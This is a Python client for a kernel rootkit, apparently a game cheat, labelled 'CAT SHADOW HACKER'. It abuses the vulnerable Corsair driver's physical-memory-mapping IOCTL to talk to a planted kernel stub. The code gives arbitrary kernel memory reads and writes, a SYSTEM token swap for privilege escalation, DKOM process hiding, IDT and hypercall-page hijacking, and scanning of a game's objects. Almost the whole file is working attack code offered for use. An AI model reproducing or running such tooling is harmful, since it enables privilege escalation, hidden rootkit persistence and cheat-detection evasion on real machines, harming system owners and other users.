import ctypes
import struct
import time
import sys

# CAT SHADOW HACKER - PHASE 2 CLIENT
# MISSION: COMMAND AND CONTROL FOR THE NANDO KERNEL DISPATCHER

class NandoClient:
    def __init__(self, mailbox_pa=0x100711F00):
        self.IOCTL_MAP_PHYS_MEM = 0x00225374
        self.PAGE_SIZE = 0x1000
        self.MAILBOX_PA = mailbox_pa
        
        # Offsets
        self.OFF_CMD = 0x00
        self.OFF_STATUS = 0x04
        self.OFF_ARG1 = 0x10
        self.OFF_ARG2 = 0x18
        self.OFF_ARG3 = 0x20
        self.OFF_ARG4 = 0x28
        self.OFF_RESULT = 0x30
        self.OFF_HEARTBEAT = 0x40
        
        self.kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        self.h_driver = None
        self.mailbox_va = None

    def connect(self):
        self.h_driver = self.kernel32.CreateFileW(
            r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None
        )
        if self.h_driver == -1:
            raise Exception("[-] Failed to open Corsair driver")
        
        # Map mailbox
        pa_base = self.MAILBOX_PA & ~0xFFF
        inp = struct.pack("<QII", pa_base, self.PAGE_SIZE, 0)
        out = ctypes.c_uint64(0)
        ret = ctypes.c_uint32(0)
        ok = self.kernel32.DeviceIoControl(
            self.h_driver, self.IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None
        )
        if not ok or not out.value:
            raise Exception("[-] Failed to map mailbox")
        
        self.mailbox_va = out.value + (self.MAILBOX_PA & 0xFFF)
        print(f"[+] Connected to Nando Kernel. Mailbox VA: 0x{self.mailbox_va:X}")

    def read_heartbeat(self):
        val = ctypes.c_ubyte.from_address(self.mailbox_va + self.OFF_HEARTBEAT).value
        return val

    def send_command(self, cmd_id, arg1=0, arg2=0, arg3=0, arg4=0, timeout=1.0):
        # 1. Clear status
        ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_STATUS).value = 0xBAADF00D
        
        # 2. Write arguments
        ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG1).value = arg1
        ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG2).value = arg2
        ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG3).value = arg3
        ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG4).value = arg4
        
        # 3. Write command ID
        ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_CMD).value = cmd_id
        
        # 4. Wait for completion (stub clears Cmd ID)
        start = time.time()
        while time.time() - start < timeout:
            if ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_CMD).value == 0:
                status = ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_STATUS).value
                result = ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_RESULT).value
                return status, result
            time.sleep(0.01)
            
        raise Exception("[-] Command timed out")

    def hook_hypercall(self, hypercall_page_kva, hook_va):
        """
        Uses Command 0x09 for surgical Hypercall page hijacking.
        """
        status, _ = self.send_command(9, hypercall_page_kva, hook_va)
        return status == 0

    def hijack_idt(self, idt_base, new_handler_va):
        """
        Uses Command 0x08 for surgical IDT hijacking.
        """
        print(f"[*] Patching IDT[3] at Base: 0x{idt_base:X}...")
        status, _ = self.send_command(8, idt_base, new_handler_va)
        return status == 0

    def hide_process(self, eprocess_kva):
        """
        Uses Command 0x07 for kernel-side DKOM process hiding.
        """
        status, _ = self.send_command(7, eprocess_kva)
        return status == 0

    def ark_scan_objects(self, gobjects_kva, start_index=0):
        """
        Uses Command 0x06 for kernel-side Ark object scanning.
        """
        status, obj_kva = self.send_command(6, gobjects_kva, start_index)
        if status == 0: return obj_kva
        return None

    def translate_kva(self, kva, cr3):
        """
        Uses Command 0x05 for kernel-side VA to PA translation.
        """
        status, pa = self.send_command(5, kva, cr3)
        if status == 0: return pa
        return None

    def safe_copy(self, destination, source, size, is_physical=False):
        """
        Uses Command 0x04 (MmCopyMemory) for elite-level safe memory copying.
        is_physical: If True, treats source as a physical address (Flag 1).
        """
        flags = 1 if is_physical else 2
        print(f"[*] Dispatching MmCopyMemory command...")
        print(f"[*] Dest: 0x{destination:X} | Src: 0x{source:X} | Size: {size}")
        
        status, transferred = self.send_command(4, destination, source, size, flags)
        if status == 0:
            print(f"[+] Copy Successful! Transferred: {transferred} bytes")
            return True
        else:
            print(f"[-] MmCopyMemory FAILED with NTSTATUS: 0x{status:X}")
            return False

    def perform_token_swap(self, target_kva, system_token):
        """
        Uses Command 0x03 in the kernel stub to perform a token swap.
        target_kva: The KVA of the token field in the target process's EPROCESS.
        system_token: The token value to write.
        """
        print(f"[*] Executing Token Swap Command (Kernel Side)...")
        print(f"[*] Target KVA: 0x{target_kva:X}")
        print(f"[*] System Token: 0x{system_token:X}")
        
        status, _ = self.send_command(3, target_kva, system_token)
        if status == 0:
            print("[+] Kernel command SUCCESS!")
        else:
            print(f"[-] Kernel command FAILED with status: {status}")

    def write_virtual(self, target_kva, value):
        """
        Uses Command 0x02 in the kernel stub to perform a virtual memory write.
        """
        status, _ = self.send_command(2, target_kva, value)
        return status == 0

    def read_virtual(self, target_kva):
        """
        Uses Command 0x01 in the kernel stub to perform a virtual memory read.
        """
        status, val = self.send_command(1, target_kva)
        if status == 0: return val
        return None

    def test_ark_single_player(self, process_cr3, gobjects_kva):
        """
        ELITE TESTING PROTOCOL: Ark Single Player Validation.
        This tests our end-to-end pipeline: Dispatcher -> Ark Scanner -> MmCopyMemory.
        """
        print("[!] INITIALIZING ARK SINGLE PLAYER VALIDATION...")
        
        # 1. Translate GObjects to Physical
        print("[*] Translating GObjects KVA to PA...")
        gobjects_pa = self.translate_kva(gobjects_kva, process_cr3)
        if not gobjects_pa:
            print("[-] Translation failed. Check CR3.")
            return False
        print(f"[+] GObjects Physical Address: 0x{gobjects_pa:X}")
        
        # 2. Run Object Scanner via Dispatcher
        print("[*] Running kernel-side Ark Object Scanner (Command 0x06)...")
        # We start at index 0 and look for the first valid object
        found_obj_kva = self.ark_scan_objects(gobjects_kva, 0)
        
        if found_obj_kva:
            print(f"[+] SUCCESS! Found UObject KVA: 0x{found_obj_kva:X}")
            
            # 3. Safe Copy the object's header for verification
            print("[*] Performing safe copy of object header (Command 0x04)...")
            # Copy 64 bytes of the object to our mailbox result buffer
            if self.safe_copy(self.mailbox_va + self.OFF_RESULT, found_obj_kva, 64):
                header = bytes((ctypes.c_ubyte * 64).from_address(self.mailbox_va + self.OFF_RESULT))
                print(f"[+] Object Header (Hex): {header[:16].hex(' ')}...")
                return True
        else:
            print("[-] Scanner returned no objects. Is the game running?")
            
        return False

if __name__ == "__main__":
    client = NandoClient()
    try:
        client.connect()
        hb = client.read_heartbeat()
        print(f"[*] Heartbeat: 0x{hb:X}")
    except Exception as e:
        print(f"[-] Error: {e}")
